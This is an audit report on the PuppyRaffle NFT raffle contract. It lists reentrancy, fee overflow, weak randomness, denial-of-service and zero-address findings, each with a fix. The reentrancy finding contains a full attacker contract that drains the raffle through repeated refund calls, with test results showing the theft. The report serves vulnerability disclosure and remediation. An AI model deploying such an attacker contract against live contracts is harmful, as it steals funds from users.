# Security Audit Report: PuppyRaffle Smart Contract

**Lead Auditor:** Mahesh BSL   
**Contract Version:** 0.7.6

## Executive Summary

This report presents the findings of a security audit conducted on the PuppyRaffle smart contract. The audit identified several critical and high-severity vulnerabilities that pose significant risks to the protocol's security and functionality. The contract implements a raffle system for NFTs but contains implementations that could lead to fund loss, manipulation, and denial of service.

## Scope

The audit covered the following smart contract:
- `PuppyRaffle.sol` - A raffle contract allowing users to enter a draw to win NFTs with different rarity levels

## Risk Classification

| Severity | Impact | Description |
|----------|--------|-------------|
| Critical | High   | Issues that can lead to direct and significant loss of funds or protocol takeover |
| High     | Medium-High | Issues that can lead to significant financial loss or protocol disruption |
| Medium   | Medium | Issues that could result in partial financial loss or protocol issues |
| Low      | Low    | Issues that do not pose immediate risk but should be addressed |
| Informational | Very Low | Code quality and optimization suggestions |

## Findings Summary

| ID | Title | Severity |
|----|-------|----------|
| [C-01](#c-01-reentrancy-vulnerability-in-refund-function) | Reentrancy Vulnerability in Refund Function | Critical |
| [H-01](#h-01-integer-overflow-and-unsafe-casting-in-totalfees) | Integer Overflow and Unsafe Casting in totalFees | High |
| [M-01](#m-01-weak-randomness-in-winner-selection) | Weak Randomness in Winner Selection | Medium |
| [M-02](#m-02-weak-randomness-in-nft-rarity-distribution) | Weak Randomness in NFT Rarity Distribution | Medium |
| [M-03](#m-03-denial-of-service-in-duplicate-check-mechanism) | Denial of Service in Duplicate Check Mechanism | Medium |
| [L-01](#l-01-missing-zero-address-validation) | Missing Zero Address Validation | Low |

## Detailed Findings

### [C-01] Reentrancy Vulnerability in Refund Function

**Description:**  
The `refund()` function in the PuppyRaffle contract is vulnerable to reentrancy attacks. The function sends ETH to users before updating the player's state in the array, violating the checks-effects-interactions pattern.

**Code Location:**
```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    // Vulnerability: Sends ETH before updating state
    payable(msg.sender).sendValue(entranceFee);

    // State update happens after the external call
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

**Impact:**  
An attacker can create a malicious contract that repeatedly calls the `refund()` function when receiving ETH, allowing them to drain the entire contract balance and steal funds from legitimate users. This was proven through a successful proof of concept that drained all funds from the contract.

**Proof of Concept:**  
The attack can be executed using a malicious contract that reenters the `refund()` function:

```solidity
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        // Enter the raffle
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        
        // Get index and trigger refund
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    // When we receive ETH, reenter the refund function
    receive() external payable {
        _stealMoney();
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }
}
```

Test results demonstrated an attacker contract starting with 0 ETH and ending with 5 ETH after draining a contract containing 4 ETH from legitimate players.

**Recommendation:**  
Implement the checks-effects-interactions pattern by updating state variables before making external calls:

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    // Update state first
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
    
    // Then make external call
    payable(msg.sender).sendValue(entranceFee);
}
```

Alternatively, implement a reentrancy guard using OpenZeppelin's ReentrancyGuard contract:

```solidity
import {ReentrancyGuard} from "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract PuppyRaffle is ERC721, Ownable, ReentrancyGuard {
    // ...
    
    function refund(uint256 playerIndex) public nonReentrant {
        // Function implementation
    }
}
```

### [H-01] Integer Overflow and Unsafe Casting in totalFees

**Description:**  
The contract uses a `uint64` type for `totalFees` but casts `uint256` values to `uint64` without checking for overflow. This occurs in the `selectWinner()` function where collected fees are added:

```solidity
totalFees = totalFees + uint64(fee);
```

**Impact:**  
For large raffles or when multiple raffles accumulate fees, the amount can exceed the maximum value of a `uint64` (18.446744073709551615 ETH). When this happens, the value will silently wrap around, causing loss of protocol fees.

For example, as commented in the code: if the fee calculated is 20 ETH, it would wrap around to approximately 1.553255926290448384 ETH, resulting in a loss of 18.45 ETH in fees.

**Proof of Concept:**
1. The maximum value of uint64 is 18.446744073709551615 ETH
2. If `totalFees` is already at 18.4 ETH and a new raffle generates 2 ETH in fees
3. The total would be 20.4 ETH, but storing this in a uint64 would result in approximately 1.95 ETH
4. This would result in a loss of approximately 18.45 ETH in fees

**Recommendation:**  
Either:
1. Use a larger data type (`uint256`) for `totalFees`:

```solidity
uint256 public totalFees = 0;
```

2. Add overflow checks before casting:

```solidity
require(fee <= type(uint64).max - totalFees, "Fee overflow");
totalFees = totalFees + uint64(fee);
```

3. Upgrade to Solidity 0.8.x which has built-in overflow protection

### [M-01] Weak Randomness in Winner Selection

**Description:**  
The contract uses easily manipulable on-chain data for random number generation:

```solidity
uint256 winnerIndex =
    uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
```

**Impact:**  
Validators (or miners in PoW chains) can manipulate `block.timestamp` and `block.difficulty` to influence the outcome of the raffle. This allows:
1. Validators to select themselves as winners
2. Collusion with participants to ensure they win
3. Front-running by watching the mempool and timing transactions

This compromises the fairness and trustlessness of the entire raffle system.

**Recommendation:**  
Use a proven randomness solution such as Chainlink VRF (Verifiable Random Function):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "@chainlink/contracts/src/v0.7/VRFConsumerBase.sol";

contract PuppyRaffle is ERC721, Ownable, VRFConsumerBase {
    bytes32 internal keyHash;
    uint256 internal fee;
    uint256 public randomResult;
    
    // Request randomness from Chainlink VRF
    function getRandomNumber() internal returns (bytes32 requestId) {
        require(LINK.balanceOf(address(this)) >= fee, "Not enough LINK");
        return requestRandomness(keyHash, fee);
    }
    
    // Callback function used by VRF Coordinator
    function fulfillRandomness(bytes32 requestId, uint256 randomness) internal override {
        randomResult = randomness;
        uint256 winnerIndex = randomResult % players.length;
        // Continue with winner selection logic
    }
}
```

### [M-02] Weak Randomness in NFT Rarity Distribution

**Description:**  
Similar to the winner selection, NFT rarity is determined using weak randomness sources:

```solidity
uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
```

**Impact:**  
Validators could manipulate block values to generate more valuable NFTs (legendary rarity) for themselves or collaborators. This undermines the value proposition and fairness of the NFT distribution mechanism.

Given that legendary puppies (5% chance) are presumably more valuable than common puppies (70% chance), this creates an economic incentive for validators to manipulate the outcome.

**Recommendation:**  
Use the same Chainlink VRF solution recommended for winner selection to determine NFT rarity:

```solidity
function determineRarity(uint256 randomness) internal pure returns (uint256) {
    uint256 rarity = randomness % 100;
    // Continue with rarity determination logic
}
```

### [M-03] Denial of Service in Duplicate Check Mechanism

**Description:**  
The duplicate check in `enterRaffle()` uses a nested loop with O(n²) complexity:

```solidity
for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}
```

**Impact:**  
As the number of players increases, gas costs grow quadratically. With a large enough number of players, the gas required will exceed block gas limits, making it impossible to add new players or interact with the contract.

The contract will become unusable when it reaches a certain number of players, causing a permanent denial of service.

**Proof of Concept:**  
Testing showed that with 100 players, the gas cost increases dramatically compared to 4 players. Extrapolating this growth, the contract would hit the block gas limit with a few hundred players.

**Recommendation:**  
Use a more efficient data structure to track players, such as a mapping:

```solidity
mapping(address => bool) public playerEntered;

function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    
    for (uint256 i = 0; i < newPlayers.length; i++) {
        address player = newPlayers[i];
        require(!playerEntered[player], "PuppyRaffle: Duplicate player");
        
        playerEntered[player] = true;
        players.push(player);
    }
    
    emit RaffleEnter(newPlayers);
}
```

In the `refund()` function, update the mapping when a player is refunded:

```solidity
function refund(uint256 playerIndex) public {
    // ... existing checks ...
    
    playerEntered[players[playerIndex]] = false;
    players[playerIndex] = address(0);
    
    // ... rest of function ...
}
```

And clear the mapping in `selectWinner()`:

```solidity
function selectWinner() external {
    // ... existing code ...
    
    // Clear player tracking
    for (uint256 i = 0; i < players.length; i++) {
        playerEntered[players[i]] = false;
    }
    delete players;
    
    // ... rest of function ...
}
```

### [L-01] Missing Zero Address Validation

**Description:**  
Several functions in the contract lack zero address validation:

1. `changeFeeAddress()` - Can set feeAddress to address(0)
2. `enterRaffle()` - No check for zero addresses in player list
3. Constructor - No validation for feeAddress parameter

**Impact:**  
Setting `feeAddress` to the zero address could lead to permanent loss of collected fees, as they would be sent to the zero address when `withdrawFees()` is called.

Allowing zero addresses in the player list could lead to unexpected behavior and potential issues in winner selection.

**Recommendation:**  
Add zero address validation to all relevant functions:

```solidity
function changeFeeAddress(address newFeeAddress) external onlyOwner {
    require(newFeeAddress != address(0), "PuppyRaffle: Fee address cannot be zero address");
    feeAddress = newFeeAddress;
    emit FeeAddressChanged(newFeeAddress);
}

constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) ERC721("Puppy Raffle", "PR") {
    require(_feeAddress != address(0), "PuppyRaffle: Fee address cannot be zero address");
    // ... rest of constructor ...
}
```

For the `enterRaffle()` function, add a check for each player:

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    for (uint256 i = 0; i < newPlayers.length; i++) {
        require(newPlayers[i] != address(0), "PuppyRaffle: Player cannot be zero address");
        players.push(newPlayers[i]);
    }
    // ... rest of function ...
}
```

## Additional Issues

Several other minor issues were identified that could be improved in future versions:

1. **Inefficient Active Player Checking:**
   The `getActivePlayerIndex()` function returns 0 if a player is not found, which could cause confusion if the player is at index 0. Consider returning a sentinel value like `type(uint256).max` instead.

2. **No Validation of raffleDuration:**
   The constructor does not validate that `_raffleDuration` is reasonable, potentially allowing a raffle with a duration of 0 seconds or an extremely long duration.

3. **Use of block.difficulty:**
   `block.difficulty` is deprecated in favor of `block.prevrandao` in newer Solidity versions.

## Conclusion

The PuppyRaffle smart contract contains several critical and high-severity vulnerabilities that put user funds and the integrity of the protocol at significant risk. Most notably:

1. A reentrancy vulnerability in the refund function could allow attackers to drain the entire contract.
2. Integer overflow in fee accounting could lead to loss of protocol fees.
3. Weak randomness implementation compromises the fairness of both winner selection and NFT rarity determination.
4. The duplicate player check mechanism could cause the contract to become unusable as it scales.

These issues should be addressed before deploying the contract to production. We recommend implementing the suggested fixes and conducting a follow-up audit to ensure all vulnerabilities have been properly addressed.

## Disclaimer

This audit report is not financial advice and should not be considered a guarantee of the absolute security of the smart contract. New vulnerabilities in the compiler, underlying Ethereum Virtual Machine, or the contract itself may be discovered in the future. Users should exercise caution and perform their own due diligence before interacting with the contract. 